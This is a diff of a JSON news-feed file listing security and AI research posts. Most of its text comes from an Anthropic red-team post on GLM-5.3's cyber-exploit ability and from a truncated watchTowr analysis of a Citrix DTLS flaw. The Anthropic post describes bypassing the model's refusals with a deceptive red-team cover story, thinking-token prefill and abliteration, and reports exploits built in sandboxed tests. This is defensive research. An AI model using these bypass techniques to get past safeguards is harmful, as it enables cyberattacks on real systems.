@@ -1,339 +1,20 @@
 {
   "schema_version": 1,
-  "date": "2026-09-30",
-  "generated_at": "2026-09-30T00:19:55.581889+00:00",
-  "item_count": 13,
-  "kinds_included": [
-    "publish"
-  ],
-  "items": [
-    {
-      "id": "a:2d23b3edbe4902b8",
-      "kind": "publish",
-      "text": "unknowncheats-ac published: https://www.unknowncheats.me/forum/general-programming-and-reversing/773326-ai-post4814284.html",
-      "actor": "unknowncheats-ac",
-      "actor_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
-      "created_at": "2026-09-30T00:16:27.541665+00:00",
-      "html_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/773326-ai-post4814284.html",
-      "title": "https://www.unknowncheats.me/forum/general-programming-and-reversing/773326-ai-post4814284.html",
-      "via": "browser_llm",
-      "collect_mode": "browser_llm",
-      "content": "",
-      "content_format": "text/plain",
-      "content_status": "failed",
-      "content_via": "",
-      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/773326-ai-post4814284.html",
-      "content_chars": 0,
-      "content_sha256": "",
-      "content_fetched_at": "2026-09-30T00:17:03.660361+00:00",
-      "content_error": "browser:RuntimeError:cf_challenge_unresolved status=403",
-      "time_precision": "daily_window",
-      "source_name": "UnknownCheats Anti-Cheat",
-      "fetch_status": "blocked",
-      "url_corrected": false
-    },
-    {
-      "id": "a:bd5b469d26717bc3",
-      "kind": "publish",
-      "text": "unknowncheats-ac published: https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4813843.html",
-      "actor": "unknowncheats-ac",
-      "actor_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
-      "created_at": "2026-09-30T00:16:27.541665+00:00",
-      "html_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4813843.html",
-      "title": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4813843.html",
-      "via": "browser_llm",
-      "collect_mode": "browser_llm",
-      "content": "",
-      "content_format": "text/plain",
-      "content_status": "failed",
-      "content_via": "",
-      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4813843.html",
-      "content_chars": 0,
-      "content_sha256": "",
-      "content_fetched_at": "2026-09-30T00:17:14.629270+00:00",
-      "content_error": "browser:RuntimeError:cf_challenge_unresolved status=403",
-      "time_precision": "daily_window",
-      "source_name": "UnknownCheats Anti-Cheat",
-      "fetch_status": "blocked",
-      "url_corrected": false
-    },
-    {
-      "id": "a:726033a757489fcb",
-      "kind": "publish",
-      "text": "cymulate-blog published: Operationalizing Agentic Cyber Defense Engineering for SecOpsRead More",
-      "actor": "cymulate-blog",
-      "actor_url": "https://cymulate.com/blog/",
-      "created_at": "2026-09-30T00:16:27.541665+00:00",
-      "html_url": "https://cymulate.com/blog/agentic-cyber-defense-secops/",
-      "title": "Operationalizing Agentic Cyber Defense Engineering for SecOpsRead More",
-      "via": "llm",
-      "collect_mode": "html_llm",
-      "content": "Operationalizing Agentic Cyber Defense Engineering for SecOps\nBy:\nAmanda Kegley\nSeptember 29, 2026\nSecurity operations teams spend too much of each day gathering context, configuring assessments, correlating evidence and coordinating follow-up actions across disconnected tools and processes.\nAgentic cyber defense engineering is designed to streamline this work by coordinating specialized agents through continuous, governed routines. Previous blogs in this series defined the\narchitecture\nand\nrequirements\nbehind the operating model. This blog shows how that model applies to three recurring SecOps workflows: validating new threats and verifying mitigation, turning exposures into informed defensive action and continuously engineering detection coverage.\nKey takeaways\nThreat validation should end with proven mitigation\n. Agents can determine whether a threat is relevant, validate defenses, deploy fixes and trigger revalidation to verify successful mitigation.\nExposure data becomes more valuable when it informs defense\n. Validated exploitability, attack paths and control performance help SecOps teams prioritize their actual risk and improve threat resilience.\nDetection engineering can become continuous\n. Agents can build coverage for new threats and exposures, test rules against realistic behavior and identify drift before an attacker exploits it.\nCommon Operational Use Cases and Routines\nAgentic cyber defense engineering supports a wide range of SecOps activities with repeatable, continuous routines. In most cases, these start with a common trigger – a new threat, a new exposure or a coverage gap – then coordinates the steps teams usually do by hand: gather the right context, run production-safe validation, correlate results across controls and drive the next action until the outcome is verified.\nRoutine: From new threat to verified mitigation\nSecOps teams must continually monitor threat intelligence, determine which threats are relevant and validate whether existing defenses are preventing and detecting, as intended. Manually reviewing new campaigns, finding applicable attack scenarios and configuring assessments can delay answers while threats continue to evolve.\nAgentic cyber defense engineering automates this workflow through a recurring threat-validation routine. Agents monitor selected CERTs, commercial threat feeds and internal intelligence sources for new campaigns, malware and attacker techniques. They deduplicate new items and compare them with the organization’s assets, technologies and threat profile to determine relevance.\nFor relevant threats, specialized agents select applicable attack scenarios or draft new ones when validation content does not exist. Then, they configure and safely execute the assessment, correlate the attack activity with prevention and detection controls and identify which behaviors were blocked, detected or missed. When fixes for security gaps are implemented, agents then verify successful mitigation.\nAs threat intelligence or the organization’s environment changes, agents continually monitor and report changes in defensive performance, allowing SecOps to track resilience against the threat over time.\nRoutine: From exposure to exposure-informed defenses\nWhen a new CVE or exposure is identified, SecOps teams must quickly determine whether affected technology is present, whether the vulnerability is exploitable in their environment, whether existing controls provide protection and what action is required. Answering those questions often requires analysts to search multiple tools, locate or build a test, configure the assessment and interpret the results.\nWith agentic cyber defense engineering, an analyst can initiate the process with plain text, such as: “Assess whether our environment is exposed to CVE-XXXX-XXXX.” The system can translate that request into a governed validation routine rather than requiring the analyst to design and coordinate every step manually.\nSpecialized agents can identify potentially affected assets, gather relevant threat and vulnerability context, select an existing attack scenario or draft one for review, and execute the assessment within defined safety policies. The routine can then correlate the results with prevention and detection controls, calculate actual risk scores based on demonstrated exploitability and prioritize for mitigation.\nRoutine: Continuous detection engineering\nSecOps teams struggle to keep pace with evolving threats and verify that their security controls are detecting all relevant attacker activity. Manually creating, tuning and testing detection rules takes significant time, while changes to rules, parsers, telemetry or data sources can cause previously effective detections to fail without warning.\nAgentic cyber defense engineering can coordinate detection validation, assessment analysis and repeatable detection engineering work. Agents can ingest existing detection rules, execute realistic attacks, correlate that activity with SIEM and EDR telemetry and determine whether the expected alerts and detections were generated.\nWhen coverage is missing, agents can deploy new tailored detection rules to security tools. Agents monitor to determine when an existing rule stops firing. Then, agents run a routine to identify the gap and mitigate.\nWhat Changes for SecOps\nAcross all three use cases, agents collect context, configure assessments, correlate evidence and coordinate follow-up actions. Routines make the work repeatable, while two-way integrations connect threat feeds, validation, controls, telemetry and ticketing systems.\nSecOps teams still define policies, scope, approvals and risk thresholds. Analysts investigate ambiguity and make business-risk decisions, while agents advance high-volume, repeatable work within those guardrails.\nSecurity leaders should measure success by the defensive learning cycle, not by the number of AI features or automated tasks. For example, determine how quickly a team can move from a relevant threat or exposure to validated evidence to verified mitigation?\nReady to Put Agentic Cyber Defense Engineering to Work?\nOperationalizing agentic cyber defense engineering means continuously and autonomously connecting intelligence, exposures, validation and security controls into use cases that produce measurable improvement. For SecOps teams, the result is not simply more automation. It is a continuous, evidence-driven way to improve defense while reducing the manual effort required to coordinate every step.\nTo explore the complete operating model,\ndownload the Agentic Cyber Defense Engineering e-book\n. To see how Cymulate can operationalize these use cases across your security program,\nschedule a demo\n.\nAmanda Kegley\nAmanda Kegley has over 15 years of experience in cybersecurity. With her in-depth knowledge of security needs in today’s dynamic threat landscape, she successfully innovates and markets new cybersecurity capabilities.\nMore about Author\nTable of Contents\nCommon Operational Use Cases and Routines\nRoutine: From new threat to verified mitigation\nRoutine: From exposure to exposure-informed defenses\nRoutine: Continuous detection engineering\nWhat Changes for SecOps\nReady to Put Agentic Cyber Defense Engineering to Work?\nCymulate Exposure Validation\nmakes advanced security testing fast and easy. When it comes to building custom attack chains, it's all right in front of you in one place.\nMike Humbert\n,\nCybersecurity Engineer\nDARLING INGREDIENTS INC.\nLearn More\nFeatured Resources\nView More Resources\nblog\nInside the Agentic Cyber Defense Engineering Architecture: How it Works\nAgentic cyber defense engineering requires more than adding AI to isolated security tasks. It requires an agentic cyber defense engineering\nRead More\nData Sheet\nCymulate Cowork\nUse AI agents and automated routines to validate exposures and streamline cyber defense engineering.\nRead More\nData Sheet\nCymulate Vero AI\nCymulate Vero AI delivers secure, domain-specific cybersecurity AI with private infrastructure and zero customer data training.\nRead More\nGET A PERSONALIZED DEMO\nReady to see Cymulate in action?\nBook a Demo",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "http",
-      "content_source_url": "https://cymulate.com/blog/agentic-cyber-defense-secops/",
-      "content_chars": 8142,
-      "content_sha256": "3b1f2c8d85620442a2b8f38f5cceb9e7ef4aecfc6801a20874376f8d8cff4e81",
-      "content_fetched_at": "2026-09-30T00:18:22.315388+00:00",
-      "content_error": "",
-      "time_precision": "daily_window",
-      "source_name": "Cymulate Blog",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:05f718f91005aa4d",
-      "kind": "publish",
-      "text": "openai-research published: MentalHealthBench 正式上线MentalHealthBench 是一项基于专家意见设立的基准，用于评估 AI 在真实心理健康对话中能否提供实用且安全的回应。",
-      "actor": "openai-research",
-      "actor_url": "https://openai.com/zh-Hans-CN/research/index/",
-      "created_at": "2026-09-30T00:16:27.541665+00:00",
-      "html_url": "https://openai.com/zh-Hans-CN/index/introducing-mentalhealthbench/",
-      "title": "MentalHealthBench 正式上线MentalHealthBench 是一项基于专家意见设立的基准，用于评估 AI 在真实心理健康对话中能否提供实用且安全的回应。",
-      "via": "browser_llm",
-      "collect_mode": "browser_llm",
-      "content": "",
-      "content_format": "text/plain",
-      "content_status": "failed",
-      "content_via": "",
-      "content_source_url": "https://openai.com/zh-Hans-CN/index/introducing-mentalhealthbench/",
-      "content_chars": 0,
-      "content_sha256": "",
-      "content_fetched_at": "2026-09-30T00:19:20.695639+00:00",
-      "content_error": "browser:RuntimeError:cf_challenge_unresolved status=403",
-      "time_precision": "daily_window",
-      "source_name": "OpenAI Research",
-      "fetch_status": "blocked",
-      "url_corrected": false
-    },
-    {
-      "id": "a:787fde03d4dfa447",
-      "kind": "publish",
-      "text": "openai-research published: 在 API 中使用 GPT-Live-1 构建更自然的语音体验GPT‑Live‑1 为 API 带来自然的全双工语音对话，并增强了指令遵循能力、自定义语音和电话支持。",
-      "actor": "openai-research",
-      "actor_url": "https://openai.com/zh-Hans-CN/research/index/",
-      "created_at": "2026-09-30T00:16:27.541665+00:00",
-      "html_url": "https://openai.com/zh-Hans-CN/index/introducing-gpt-live-1-in-the-api/",
-      "title": "在 API 中使用 GPT-Live-1 构建更自然的语音体验GPT‑Live‑1 为 API 带来自然的全双工语音对话，并增强了指令遵循能力、自定义语音和电话支持。",
-      "via": "browser_llm",
-      "collect_mode": "browser_llm",
-      "content": "",
-      "content_format": "text/plain",
-      "content_status": "failed",
-      "content_via": "",
-      "content_source_url": "https://openai.com/zh-Hans-CN/index/introducing-gpt-live-1-in-the-api/",
-      "content_chars": 0,
-      "content_sha256": "",
-      "content_fetched_at": "2026-09-30T00:19:31.402296+00:00",
-      "content_error": "browser:RuntimeError:cf_challenge_unresolved status=403",
-      "time_precision": "daily_window",
-      "source_name": "OpenAI Research",
-      "fetch_status": "blocked",
-      "url_corrected": false
-    },
-    {
-      "id": "a:6cee14e882426586",
-      "kind": "publish",
-      "text": "openai-research published: OpenAI 模型提出纳维–斯托克斯问题的解法我们在此分享由 AI 生成的纳维–斯托克斯千禧年大奖难题解法，包括相关论文和 Lean 形式化证明。",
-      "actor": "openai-research",
-      "actor_url": "https://openai.com/zh-Hans-CN/research/index/",
-      "created_at": "2026-09-30T00:16:27.541665+00:00",
-      "html_url": "https://openai.com/zh-Hans-CN/index/navier-stokes-solution/",
-      "title": "OpenAI 模型提出纳维–斯托克斯问题的解法我们在此分享由 AI 生成的纳维–斯托克斯千禧年大奖难题解法，包括相关论文和 Lean 形式化证明。",
-      "via": "browser_llm",
-      "collect_mode": "browser_llm",
-      "content": "",
-      "content_format": "text/plain",
-      "content_status": "failed",
-      "content_via": "",
-      "content_source_url": "https://openai.com/zh-Hans-CN/index/navier-stokes-solution/",
-      "content_chars": 0,
-      "content_sha256": "",
-      "content_fetched_at": "2026-09-30T00:19:42.101624+00:00",
-      "content_error": "browser:RuntimeError:cf_challenge_unresolved status=403",
-      "time_precision": "daily_window",
-      "source_name": "OpenAI Research",
-      "fetch_status": "blocked",
-      "url_corrected": false
-    },
-    {
-      "id": "a:8ff0437b1e3b01f7",
-      "kind": "publish",
-      "text": "openai-research published: 研究加速：OpenAI 内部视角在 OpenAI 内部，编程智能体正在重塑 AI 研究。探索有关智能体使用情况、实验速度、任务复杂度和研究加速的早期数据。",
-      "actor": "openai-research",
-      "actor_url": "https://openai.com/zh-Hans-CN/research/index/",
-      "created_at": "2026-09-30T00:16:27.541665+00:00",
-      "html_url": "https://openai.com/zh-Hans-CN/index/research-acceleration-view-inside-openai/",
-      "title": "研究加速：OpenAI 内部视角在 OpenAI 内部，编程智能体正在重塑 AI 研究。探索有关智能体使用情况、实验速度、任务复杂度和研究加速的早期数据。",
-      "via": "browser_llm",
-      "collect_mode": "browser_llm",
-      "content": "",
-      "content_format": "text/plain",
-      "content_status": "failed",
-      "content_via": "",
-      "content_source_url": "https://openai.com/zh-Hans-CN/index/research-acceleration-view-inside-openai/",
-      "content_chars": 0,
-      "content_sha256": "",
-      "content_fetched_at": "2026-09-30T00:19:52.791098+00:00",
-      "content_error": "browser:RuntimeError:cf_challenge_unresolved status=403",
-      "time_precision": "daily_window",
-      "source_name": "OpenAI Research",
-      "fetch_status": "blocked",
-      "url_corrected": false
-    },
-    {
-      "id": "a:80e4ef842b12917f",
-      "kind": "publish",
-      "text": "anthropic-research published: Sep 29, 2026Frontier Red TeamGLM-5.3 and the spread of advanced cyber capabilities",
-      "actor": "anthropic-research",
-      "actor_url": "https://www.anthropic.com/research",
-      "created_at": "2026-09-30T00:16:27.541665+00:00",
-      "html_url": "https://www.anthropic.com/research/glm-5-3-and-the-spread-of-advanced-cyber-capabilities",
-      "title": "Sep 29, 2026Frontier Red TeamGLM-5.3 and the spread of advanced cyber capabilities",
-      "via": "llm",
-      "collect_mode": "html_llm",
-      "content": "Frontier Red Team\nPolicy\nGLM-5.3 and the spread of advanced cyber capabilities\nSep 29, 2026\nAndrew Fasano, Marius Fleischer\nCole McFaul, Robert Xiao, Tripp Gallagher\nFive months ago, we\nannounced\nClaude Mythos Preview, the first AI model that could autonomously build sophisticated, end-to-end cyber exploits. The rapid rate of improvement in AI suggested to us that this ability would eventually proliferate to many other models, making it much easier for malicious cyber actors to launch highly impactful cyberattacks.\nIn light of these considerations, we chose to release Claude Mythos Preview in a limited way, through Project Glasswing—which enabled trusted cyber defenders to find\nmore than 10,000 vulnerabilities\nin critical software, giving them a head start before malicious actors had access to similarly capable models.\nBut those models have now arrived. In this post, we share our analysis of GLM-5.3, the latest AI model developed by Zhipu AI (known outside of China as Z.ai). Like Claude Mythos Preview, GLM-5.3 has strong capabilities for autonomously building end-to-end cyber exploits. But GLM-5.3 is unlike other frontier models in that it has been released without meaningful safeguards to limit misuse. We find that attackers can bypass GLM-5.3’s safeguards between 64% and 100% of the time with simple techniques in our simulated tests. In contrast, these attacks did not succeed against safeguarded Claude models in our testing. We assess that GLM-5.3’s lax safeguards significantly increase the cyber capabilities available to malicious actors. At the same time, these capabilities can also benefit defenders working to secure their systems.\nOn Sept. 17, NIST’s Center for AI Standards and Innovation (CAISI) published\nits own assessment\nof GLM-5.3’s cyber capabilities. CAISI found that GLM-5.3 is “the most cyber-capable open-weight model released to date” and that it lags the US frontier by about four months on an aggregate of CAISI’s cyber benchmarks. Our capability findings broadly match CAISI’s. In CAISI’s comparison, US models were tested with cyber safeguards disabled when applicable, and the US frontier includes models released only to vetted users. Attackers can’t readily access those versions of US models, but anyone can download GLM-5.3. This post adds our analysis of how easily GLM-5.3’s safeguards can be bypassed or removed.\nFigure 1.\nSummary of findings. Top: The increase in exploitation capability between Claude Opus 4.6 and Claude Mythos Preview mirrors the jump in capabilities between GLM-5.2 and GLM-5.3. Claude models are released with cyber safeguards, and versions with reduced safeguards are limited to vetted users. Anyone can download and use GLM-5.3. Bottom: The limited safeguards in GLM-5.3 can be bypassed with standard techniques that did not work against, or do not apply to, Claude models in our testing.\nGLM-5.3 can develop working exploits end to end\nTo understand how GLM-5.3 could enable cyber threat actors to find and exploit real software vulnerabilities, we ran evaluations using automated benchmarks and human-in-the-loop workflows. For both approaches, we ran the tested models in isolated and sandboxed environments so they can only attack offline targets that we have set up for the purposes of these evaluations. We focus primarily on exploit development capability, as this is where Claude Mythos Preview demonstrated a notable jump versus previous Claude models.\nFirst, we ran the model on\nExploitBench\n, which measures how well AI models can exploit known vulnerabilities in the V8 engine used by Google Chrome. Here we focus on the models’ ability to develop end-to-end exploits successfully, as this is the most relevant capability for attackers, and where we see significant changes between models. We find that GLM-5.3 develops end-to-end exploits in 50 of 410 attempts. Claude Mythos Preview did so at a similar rate—in 56 of 410 attempts.\nIn our internal Binary Exploitation benchmark,\n1\nwe test whether models can find and exploit vulnerabilities in popular open source projects that participate in Google’s OSS-Fuzz project. Here, full credit is awarded for a full control-flow hijack. We evaluate several models on 100 tasks from the benchmark (selected at random), and find that GLM-5.3 develops full control flow hijacks in 4% of the trials; Claude Mythos Preview did so in 6%. Although GLM-5.3 performs below Claude Mythos Preview here, a meaningful threshold has clearly been crossed: earlier models, like Claude Opus 4.6 and GLM-5.2, do not succeed in any of them.\nFigure 2.\nExploitation capability versus output-token budget. Each line shows the share of a model’s attempts that reached the benchmark’s top outcome versus the output tokens used. Both figures show performance of two Claude models run with safeguards disabled (Opus 4.6, Mythos Preview), two GLM models (5.2 and 5.3), and results from the latest open-weight models released by Moonshot AI (Kimi K3) and DeepSeek (V4.1-Flash).\nNext, we evaluated how GLM-5.3 performs on open-ended offensive cyber tasks in the hands of human experts (mirroring our\ntesting with Claude Mythos Preview\nearlier this year). Here, we select targets in which the human experts are unaware of existing vulnerabilities, then ask them to use the model to identify and exploit novel flaws. These experiments tested what the experts could do in a short time-frame: they typically ran for a day or less, with less than an hour of human focus in total.\nFigure 3.\nA redacted screenshot of an exploit page generated by GLM-5.3 during researcher-driven testing, shown stealing a user’s SSH private key via a malicious website. The exploit chains together multiple 0-day vulnerabilities the model discovered in a component of a popular web browser, reading a sensitive file off the user’s computer.\nIn the first of these sessions, a researcher used GLM-5.3 on a sandboxed machine with a local Linux build of a popular web browser. Over the course of a day (and with limited human attention), GLM-5.3 found several previously unknown vulnerabilities in the browser’s JavaScript engine, and chained them together into a working exploit: a webpage that, when visited, reads arbitrary files from the visitor’s computer (shown in Figure 3). This exploit targets the Linux build of the browser, since that was the only environment made available to the model. However, we believe these vulnerabilities could also impact users on other platforms, though the path to exploitation there may be more complex. (We’ve disclosed these vulnerabilities to the maintainer.) Later in the session, the researcher also identified exploitable vulnerabilities in several other widely used systems with GLM-5.3, including wireless and graphics drivers and network-facing device software. We are currently reviewing these reports and we will disclose to maintainers as appropriate.\nIn a second session, a researcher used GLM-5.3-Flash (a smaller, less capable version of GLM-5.3) to develop an exploit for a\nknown\nvulnerability (we’ve previously written about these “N-day” vulnerability exploits\nhere\n). Here, the researcher focused on a recently disclosed flaw in Google Chrome (CVE-2026-11645) to see how quickly the model could turn a public fix into a working attack. The researcher provided GLM-5.3-Flash with public details of this CVE and another known flaw. With no significant direction from the researcher, GLM-5.3-Flash chained together exploits for these two flaws, building a reliable exploit chain for an ARM64 target, bypassing pointer-authentication (PAC) hardening. This took 20 minutes of human attention, plus 8 hours of work for GLM-5.3-Flash. At Zhipu’s API prices, this effort would have cost $20.40.\nGLM-5.3 lacks robust safeguards\nGLM-5.3 has been released with some built-in safeguards: if a user asks for something clearly harmful, the model will often refuse.\n2\nIn our testing, we found that these safeguards could be bypassed or removed with a variety of simple techniques.\nThe most intensive—and most successful—method is a\nstandard refusal reduction technique\nknown as “abliteration”. Since GLM-5.3 is released as an open-weight model, users can reconfigure it to remove its refusals with little change in its capabilities. Several developers released abliterated versions of GLM-5.3 to the public within days of the model’s release.\nTo research how far abliteration allows attackers to bypass GLM-5.3’s safeguards, we produced an abliterated copy ourselves, and then ran it on three public benchmarks (\nJailbreakBench\n,\nHarmBench\n, and\nStrongREJECT\n) that measure how often a model complies with clearly harmful requests. Abliterating the model took our team—which had never previously attempted this task—about 2,200 GPU hours at a computation cost of roughly $4,400.\n3\nAbliterating GLM-5.3-Flash took about 600 GPU hours. The edit took GLM-5.3’s refusal rate from above 90% to about 3% and 2% on the first two benchmarks (JailbreakBench and HarmBench) and to 12% on the third (StrongREJECT). Abliteration did not significantly reduce the model’s capabilities: on GPQA-Diamond, an evaluation that measures general scientific capabilities, the standard and abliterated models scored the same results; on a tested subset of the CyberGym evaluations, the abliterated version scored a few percent lower (as shown in the chart below).\nFigure 4.\nTop: Mean refusal rates across JailbreakBench, HarmBench, and StrongREJECT for the released and abliterated GLM models and for Claude models. After abliteration, the GLM models rarely refuse these queries. Claude models cannot be abliterated because their weights aren’t publicly released or customizable. Bottom: Performance of GLM-5.3 and GLM-5.3-Flash versus their abliterated variants on GPQA-Diamond and CyberGym. Abliteration leaves capability largely intact.\nIn our testing, we observed that GLM-5.3’s safeguards can also be circumvented\nwithout\nusing an abliterated version of the model. We placed the model in a simulated world\n4\nin which it was given overtly malicious requests to attack critical systems. Out of the box, GLM-5.3 refused in all trials (as with the other models we tested). But we identified several simple ways to bypass the GLM models’ safeguards, such that it would respond to these requests in most or all cases. These include:\nProviding a deceptive prompt, such as telling the model that it is an autonomous red-team agent working on an exercise. This gets GLM-5.3 to engage 64% of the time.\nPrefilling the models’ thinking tokens so that it appears to have considered the user’s request and decided to proceed. This gets GLM-5.3 to engage 92% of the time.\nUsing an abliterated version of the model, as described above. This gets GLM-5.3 to engage 100% of the time.\nIn our testing, none of these techniques got safeguarded Claude models to carry out the harmful tasks we tested. Claude’s safeguards blocked the requests that used deceptive prompts. The Anthropic API provides would-be attackers with no way to prefill Claude’s thinking. And since Claude’s weights are not provided to users, they cannot be abliterated to change Claude’s behavior.\nFigure 5.\nRate at which each model tried to connect to a remote target system after an overtly harmful request by model and bypass condition (50 samples per cell, five attack orders × two targets × five attempts). GLM-5.3 rises from zero engagement on direct requests to 64%, 92%, and 100% under a cover story, prefill, and abliteration respectively, while every tested Claude model stays at zero under API safeguards. Padlocked cells mark attacks that are not generally feasible against the Claude API.\nTo demonstrate how the abliterated version of GLM-5.3 is willing to engage in harmful tasks, we highlight one quote from the chain of thought that it generated:\nFigure 6.\nIn our simulated environment, the abliterated version of GLM-5.3 considers how to engage in an overtly harmful request, ultimately deciding to follow the user’s instructions despite some initial ethical concerns. Text is quoted verbatim from the model’s chain of thought.\nWhat does this mean?\nGLM-5.3 will likely give malicious actors access to capabilities that will allow them to find and exploit cyber vulnerabilities without meaningful restrictions. This is unlike any other similarly capable AI model, all of which were released with safeguards or through limited access programs. The release of GLM-5.3 is a meaningful step change in the cyber capabilities available to attackers.\nAnthropic\nand\nother US AI labs\nhave published recent reports that disclose how cyber attackers have tried to use AI systems. Given this evidence, we think it’s likely both state and non-state actors will use models like GLM-5.3 to cause real-world harm.\nOn the other hand, models with this level of capability can also be used by defenders. Our view is that cyber defenders should use the best available tools that meet their needs. We're working to safely expand access to Claude's cyber capabilities to as many defenders as we can. Cyber defenders face attackers who will use every capable tool they can, and we believe defenders should be equipped with frontier models that are at least as good as those their adversaries are using.\nThrough Project Glasswing (and other efforts, like\nPatch the Planet\n), cyber defenders have made meaningful progress towards securing critical systems in advance of this moment—but much work remains to be done. While vetted defenders can now use even more advanced models like Claude Mythos 5.1 through our trusted access programs, a critical threshold in freely accessible capabilities has now been crossed. GLM-5.3 underscores the urgency of expanding access to advanced frontier models to a broader set of entities to empower cyber defenders.\nGovernments should conduct safety testing on sufficiently capable AI models, including successors to GLM-5.3. Without high quality evaluations from independent sources, the impact of these capabilities might not become fully clear to model developers until it is too late. As AI developers across the world build increasingly capable open weight models, we hope they work to appropriately safeguard these capabilities and prevent misuse.\nFootnotes\nWe have previously published results from this benchmark under the name “OSS-Fuzz”; here we tested models on a randomly selected subset of 100 tasks from this evaluation.\nThe cyber tasks detailed in the prior section did not trigger such refusals on the released model, but we observe refusals if we ask GLM-5.3 for assistance developing malware or helping launch cyberattacks against remote targets.\nMost of this went to exploring variants in parallel and to testing model capabilities after modifications. We estimate a team experienced with the technique, starting from scratch on this model, would need closer to 600 GPU hours ($1,200).\nNo model-generated code is ever executed in this simulation and the model does not have any way to interact with external systems. In this isolated test environment the model under evaluation is given access to a fake bash tool which does not execute the provided code. Instead, we ask another LLM to approximate the command’s result given a description of the simulated world. These simulations are not perfect portrayals of real-world conditions, and are therefore imperfect measures of how a model would behave in a given situation.\nRelated content\nWhat do you want from AI?\nWe’re launching a new study using Anthropic Interviewer to learn from your experiences with AI, and we invite you to participate.\nRead more\nYes, Claude can do Nine Loops\nGuest writer and physicist Matt von Hippel shares what happened when he issued a challenge to AI companies to solve a problem in his former subfield of theoretical physics.\nRead more\nProject Swap: What happens when agents trade for us?\nTo see what works and what breaks when agents are sent into a market, we made a miniature market of Claudes.\nRead more\nSubscribe to the Frontier Red Team newsletter\nGet updates on our latest red-teaming research and findings.",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "http",
-      "content_source_url": "https://www.anthropic.com/research/glm-5-3-and-the-spread-of-advanced-cyber-capabilities",
-      "content_chars": 16100,
-      "content_sha256": "ec1cfbd6d8a3f825edb685b15b766d4122d028100de9e1358c14657ece0d2bdb",
-      "content_fetched_at": "2026-09-30T00:19:55.568168+00:00",
-      "content_error": "",
-      "time_precision": "daily_window",
-      "source_name": "Anthropic Research",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:9500df075a9b45c2",
-      "kind": "publish",
-      "text": "watchtowr-labs published: Here We Go Again (Citrix NetScaler DTLS Preauth Memory Overflow CVE-2026-88772)",
-      "actor": "watchtowr-labs",
-      "actor_url": "https://labs.watchtowr.com/",
-      "created_at": "2026-09-29T13:55:35+00:00",
-      "html_url": "https://labs.watchtowr.com/here-we-go-again-citrix-netscaler-dtls-preauth-memory-overflow-cve-2026-88772/",
-      "title": "Here We Go Again (Citrix NetScaler DTLS Preauth Memory Overflow CVE-2026-88772)",
-      "via": "rss",
-      "collect_mode": "rss",
-      "content": "Part 1 of this week's saga can be found\nhere.\nThis research is a glimpse into the capabilities that power our Preemptive Exposure Management solution, enabling organizations to rapidly react to emerging threats: the\nwatchTowr Platform.\nWhat Is A Citrix NetScaler?\nNetScaler, from Citrix (now under Cloud Software Group), is an application delivery controller - some believe it qualifies to be described as a security appliance. It sits in front of an organization's applications and handles load balancing, traffic management, and SSL/TLS termination. NetScaler Gateway adds VPN and secure remote access.\nWhat Is the Purpose of a Security Appliance?\nA security appliance exists to keep an organization secure by standing between its systems and threats that attempt to reach them. It concentrates a defensive function, controlling remote access, filtering hostile traffic, or enforcing who is allowed in, at a single chokepoint that every connection has to pass through.\nWhat Does \"Hardened\" Mean In \"Hardened Security Appliance\"?\n\"Hardened\" means the vendor has stripped the device down and locked it up: minimal running services, restricted shell access, a controlled update path, and defaults tuned for security.\nThe premise is that it is tougher to break into than a general-purpose server.\nWhat is CVE-2026-88772, and When Will This End?\nAs we discussed in\nyesterday's blog post\n, the advisory released by Citrix on Sunday did not just contain one in-the-wild exploited vulnerability - but two. Today, we're going to be analyzing CVE-2026-88772.\nCVE-2026-88772 is the DTLS memory overflow we walk through here. It is one of eight vulnerabilities Citrix fixed in a single bulletin,\nCTX697096\n. It requires DTLS to be enabled which is the default on VPN virtual servers unless an administrator explicitly set\n-dtls OFF\nand was exploited in the wild as a zero-day.\nAs a call back and for consistency with yesterday’s blog post, here is everything the advisory covers:\nCVE\nDescription\nCVSS 4.0\nExploited in the Wild\nCVE-2026-88771\nImproper input validation that lets an unauthenticated attacker run arbitrary commands. Affects the default configuration.\n9.5 Critical\nYes\nCVE-2026-88772\nMemory overflow that can lead to remote code execution or denial of service when DTLS is enabled (the default for VPN virtual servers).\n9.5 Critical\nYes\nCVE-2026-88773\nHTTP request smuggling (inconsistent interpretation of HTTP requests). Depends on specific configurations.\n9.3 Critical\nNot reported\nCVE-2026-88774\nNetScaler ADC and NetScaler Gateway vulnerability. Depends on specific configurations.\n7.0 High\nNot reported\nCVE-2026-88775\nMemory overflow. Depends on specific configurations.\n8.8 High\nNot reported\nCVE-2026-88776\nMemory overflow. Depends on specific configurations.\n8.8 High\nNot reported\nCVE-2026-88777\nMemory overflow. Depends on specific configurations.\n8.8 High\nNot reported\nCVE-2026-88778\nPredictable value from previous values. Fixed by enabling Enhanced ISN Generation, not by the upgrade alone.\n8.8 High\nNot reported\nThe Citrix\nadvisory\nrecommends updating to the following fixed versions:\nCitrix NetScaler ADC and Citrix NetScaler Gateway 14.1-73.37 and later releases\nCitrix NetScaler ADC and Citrix NetScaler Gateway 13.1-64.23 and later releases of 13.1\nCitrix NetScaler ADC 14.1-FIPS 14.1-73.37 FIPS and later releases of 14.1-FIPS\nCitrix NetScaler ADC 13.1-FIPS and 13.1-NDcPP 13.1-37.279 and later releases of 13.1-FIPS and 13.1-NDcPP\nIntroduction to the DTLS Packet\nFirst, some DTLS basics. DTLS is TLS bolted onto UDP. A single UDP packet can carry one or more DTLS records, and every record opens with a 13-byte header.\nWhen a record carries handshake data, that data begins with a further 12-byte header describing a handshake fragment:\n0 1 2 3\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Content 